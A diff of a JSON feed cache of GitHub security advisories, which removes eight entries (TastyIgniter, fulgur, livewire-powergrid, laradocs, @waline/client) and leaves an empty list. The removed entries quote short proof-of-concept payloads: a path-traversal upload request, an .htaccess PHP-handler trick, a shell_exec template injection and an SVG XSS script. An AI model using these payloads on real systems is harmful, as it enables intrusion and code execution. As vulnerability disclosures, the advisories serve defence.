@@ -1,83 +1,10 @@
 {
   "feed": "github-advisories",
   "source": "https://api.github.com/advisories?type=reviewed&per_page=100&sort=published&direction=desc",
-  "fetched_at": "2026-11-27T15:30:04+00:00",
+  "fetched_at": "2026-11-28T05:02:20+00:00",
   "window_days": 3,
-  "window_start": "2026-11-25",
-  "window_end": "2026-11-27",
-  "count": 8,
-  "items": [
-    {
-      "cve": "CVE-2026-69181",
-      "ghsa": "GHSA-rj59-9f77-mvg5",
-      "title": "TastyIgniter permits Path Traversal in Media Upload",
-      "description": "### Summary\nArbitrary file write outside `media/uploads/`\n\n### Details\nIt is possible to perform Path Traversal in Media Manager file upload function as admin.\n\n\n### PoC\n- login as admin\n- upload a image but in the request, change the path from `/` to `/../../`.\n\nRequest\n```http\nPOST /admin/media_manager HTTP/1.1\nHost: localhost:8888\nContent-Length: 302\nsec-ch-ua-platform: \"Linux\"\nX-CSRF-TOKEN: 2vv3ZKpvfj2SkbbJzqmf8G053mNXqPLktxqd5eMx\nCache-Control: no-cache\nAccept-Language: en-US,en;q=0.9\nsec-ch-ua: \"Not-A.Brand\";v=\"24\", \"Chromium\";v=\"146\"\nsec-ch-ua-mobile: ?0\nX-IGNITER-FILEUPLOAD: mediamanager\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36\nAccept: application/json\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryN13ytndlhtodIsbE\nOrigin: http://localhost:8888\nSec-Fetch-Si",
-      "severity": "high",
-      "published": "2026-11-25T22:54:30+00:00",
-      "link": "https://github.com/advisories/GHSA-rj59-9f77-mvg5"
-    },
-    {
-      "cve": "CVE-2026-69179",
-      "ghsa": "GHSA-7wwv-x6mc-pxqx",
-      "title": "TastyIgniter allows Remote Code Execution (RCE) via Unrestricted file upload in Media Manager",
-      "description": "### Summary\nMedia manager accepts `.htaccess` file which can be used to perform RCE.\n\n### Details\nThe file upload functionality from media manager somehow accepts `.htaccess` file. This file could be used to allow any extension to run PHP command. By doing so, it is possible to perform RCE.\n\n### PoC\n- Login as Admin\n- Create a `.htaccess` file with the following code.\n\n```\n<FilesMatch \"\\.jpg$\">\n    SetHandler application/x-httpd-php\n</FilesMatch>\n```\n- Upload the `.htaccess` file via the Media Manager.\n\nRequest\n```\nPOST /admin/media_manager HTTP/1.1\nHost: localhost:8888\nContent-Length: 357\nsec-ch-ua-platform: \"Linux\"\nX-CSRF-TOKEN: 2vv3ZKpvfj2SkbbJzqmf8G053mNXqPLktxqd5eMx\nCache-Control: no-cache\nAccept-Language: en-US,en;q=0.9\nsec-ch-ua: \"Not-A.Brand\";v=\"24\", \"Chromium\";v=\"146\"\nsec-ch-ua-mobile: ?0\nX-IGNITER-FILEUPLOAD: mediamanager\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0",
-      "severity": "critical",
-      "published": "2026-11-25T22:24:36+00:00",
-      "link": "https://github.com/advisories/GHSA-7wwv-x6mc-pxqx"
-    },
-    {
-      "cve": "CVE-2026-69178",
-      "ghsa": "GHSA-743w-g9pf-8p94",
-      "title": "TastyIgniter mail template editor allows remote code execution via server-side template injection",
-      "description": "### Summary\n**Where:** `POST /admin/mail_templates/edit/{id}` → body field  \n**Who can trigger:** Any admin user with `Admin.MailTemplates` permission  \n**Impact:** Arbitrary PHP execution on the server — full RCE\n\n### Details\nThe Mail templates is vulnerable to SSTI and did not perform an validation and sanitization.\n\n### PoC\n\n- login as admin\n- create new mail template with following command\n\n```\n@php echo shell_exec('echo \"RCE Executed\";id'); @endphp\n```  \n\n- save the request\n- execute the request using `X-IGNITER-REQUEST-HANDLER: onTestTemplate`\n\nRequest\n```http\nPOST /admin/mail_templates/edit/20 HTTP/1.1\nHost: localhost:8888\nContent-Length: 47\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36\nsec-ch-ua-platform: \"Linux\"\nX-CSRF-TOKEN: L22Pxu6L5hHmHgoC4RB1Zz5Py16muXvsRIOBtxuY\nAccept-Language: en-US,en;q=0.9\nsec-ch-ua: \"No",
-      "severity": "critical",
-      "published": "2026-11-25T22:24:13+00:00",
-      "link": "https://github.com/advisories/GHSA-743w-g9pf-8p94"
-    },
-    {
-      "cve": "CVE-2026-69177",
-      "ghsa": "GHSA-mqg7-fw3f-mhp7",
-      "title": "TastyIgniter allows stored XSS via file upload",
-      "description": "### Summary\nStored XSS via uploading SVG files \n\n### Details\nIt is possible to upload SVG files that contains XSS.\n\n### PoC\n\n- login as admin\n- create the following SVG file\n\n```\n<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"400\" height=\"400\" viewBox=\"0 0 124 124\" fill=\"none\">\n<rect width=\"124\" height=\"124\" rx=\"24\" fill=\"#000000\"/>\n   <script type=\"text/javascript\">  \n      alert(1);\n   </script>\n</svg>\n```  \n\n- upload the SVG file in media manager\n\n```\nPOST /admin/media_manager HTTP/1.1\nHost: localhost:8888\nContent-Length: 514\nsec-ch-ua-platform: \"Linux\"\nX-CSRF-TOKEN: 2vv3ZKpvfj2SkbbJzqmf8G053mNXqPLktxqd5eMx\nCache-Control: no-cache\nAccept-Language: en-US,en;q=0.9\nsec-ch-ua: \"Not-A.Brand\";v=\"24\", \"Chromium\";v=\"146\"\nsec-ch-ua-mobile: ?0\nX-IGNITER-FILEUPLOAD: mediamanager\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ch",
-      "severity": "medium",
-      "published": "2026-11-25T21:52:15+00:00",
-      "link": "https://github.com/advisories/GHSA-mqg7-fw3f-mhp7"
-    },
-    {
-      "cve": "CVE-2026-68539",
-      "ghsa": "GHSA-vw2v-g4x7-xcqg",
-      "title": "fulgur allows Unbounded string-set value accumulation causes memory/CPU exhaustion (denial of service)",
-      "description": "`fulgur` converts untrusted HTML/CSS into PDF, commonly on a server that\nprocesses input supplied by many tenants. In versions from 0.4.4 up to (but not\nincluding) the patched release, the CSS `string-set` named-string values\nresolved from a document were accumulated per element with no memory budget,\nletting a small crafted document amplify into large retained memory (and the CPU\nto copy it) — a denial of service.\n\nA `string-set` value is attacker-controlled: it is resolved from an element's\nown text (`content(text)`), from one of its attributes (`attr(...)`), or from a\nCSS string literal. fulgur accumulated these values per element in two unbounded\nplaces:\n\n1. **Store (default path).** For every element that matches a `string-set` rule,\n   fulgur pushes a copy of the resolved value into a store that is retained for\n   the whole render and cloned again downstream into a per-node lookup ",
-      "severity": "high",
-      "published": "2026-11-25T19:46:45+00:00",
-      "link": "https://github.com/advisories/GHSA-vw2v-g4x7-xcqg"
-    },
-    {
-      "cve": "CVE-2026-65971",
-      "ghsa": "GHSA-7fgc-3h6c-698r",
-      "title": "livewire-powergrid: SQL injection via sortDirection in naturalSort queries",
-      "description": "## [Description]\n\nThe public Livewire property `sortDirection` is interpolated **verbatim** into a\nraw SQL `ORDER BY` clause and is not restricted to `asc`/`desc`, allowing arbitrary\nSQL injection through `POST /livewire/update`.\n\n**Data flow**\n\n- **Source** — `src/Concerns/Sorting.php`: `public string $sortDirection;` is a\n  Livewire-bound property with no whitelist/validation (it is only assigned and\n  flipped by `reverseSort()`), so it is fully attacker-controlled via the standard\n  Livewire update endpoint.\n- **Taint** — `src/DataSource/Processors/Database/Pipelines/ColumnRawQueries.php`,\n  `resolvePlaceholders()`:\n  ```php\n  preg_replace_callback('/\\{(\\w+)\\}/', fn ($m) => data_get($this->component, $m[1], ''), $sql);\n  ```\n  substitutes `{sortDirection}` with the raw property value.\n- **Sink** — `src/DataSource/Support/Sql.php::getSortSqlByDriver()` builds the\n  `naturalSort` expres",
-      "severity": "high",
-      "published": "2026-11-25T19:44:57+00:00",
-      "link": "https://github.com/advisories/GHSA-7fgc-3h6c-698r"
-    },
-    {
-      "cve": "CVE-2026-65973",
-      "ghsa": "GHSA-h746-qpxh-ph7g",
-      "title": "laradocs  Command injection via unescaped Node.js binary path in KaTeX SSR",
-      "description": "### Summary\nLocal command injection (CWE-78) in server-side KaTeX rendering via an unescaped Node.js binary path in a `proc_open()` command string.\n\n### Affected versions\n>= 0.4.0, < 1.0.0\n\n### Patched versions\n>= 1.0.0 (fixed in commit `100cb1e`)\n\n### Impact\nWhen rendering KaTeX math **server-side**, Laradocs invoked Node via `proc_open()` with a command string in which the Node binary argument was not passed through `escapeshellarg()`.\n\n`MarkdownPipelineFactory` constructs `KatexExtension` with the configured binary, which the render path resolved as:\n\n```php\n$node = $this->nodeBin ?? 'node';\n$cmd = $node . ' ' . escapeshellarg($tmpFile) . ' ' . escapeshellarg($input);\n```\n\n`$this->nodeBin` comes from `Config::nullableString('laradocs.parser.katex.node_bin')`. Both possible sources — the configured `node_bin` value, or the `'node'` default resolved from `PATH` — are operator-controlled",
-      "severity": "medium",
-      "published": "2026-11-25T19:41:53+00:00",
-      "link": "https://github.com/advisories/GHSA-h746-qpxh-ph7g"
-    },
-    {
-      "cve": "CVE-2026-64670",
-      "ghsa": "GHSA-crj3-q72p-ggqm",
-      "title": "@waline/client vulnerable to stored XSS through unsanitized comment edit previews",
-      "description": "### Summary\n\n`@waline/client` renders the comment editor's live preview with `marked` and no sanitizer (`utils/markdown.ts`), and the preview is injected with `v-html`.\n\nWhen a comment is edited, the editor is seeded with the comment's raw, un-sanitized body (`orig`).\n\nOnly administrators and the comment owner can edit. So an administrator who clicks Edit on an attacker's comment renders that attacker's raw HTML in their own session: an unauthenticated commenter achieves privilege-escalation stored XSS against a moderator with a single Edit click.\n\n### Details\n\n`packages/client/src/utils/markdown.ts:18-37` renders markdown with `marked` and returns the raw HTML with no sanitization (the client bundles no DOMPurify):\n\n```ts\nreturn marked.parse(parseEmoji(content, emojiMap)) as string;\n```\n\n`packages/client/src/components/CommentBox.vue`:\n\n```ts\nonMounted(() => {\n  if (props.edit?.objectId",
-      "severity": "critical",
-      "published": "2026-11-25T15:26:23+00:00",
-      "link": "https://github.com/advisories/GHSA-crj3-q72p-ggqm"
-    }
-  ]
+  "window_start": "2026-11-26",
+  "window_end": "2026-11-28",
+  "count": 0,
+  "items": []
 }
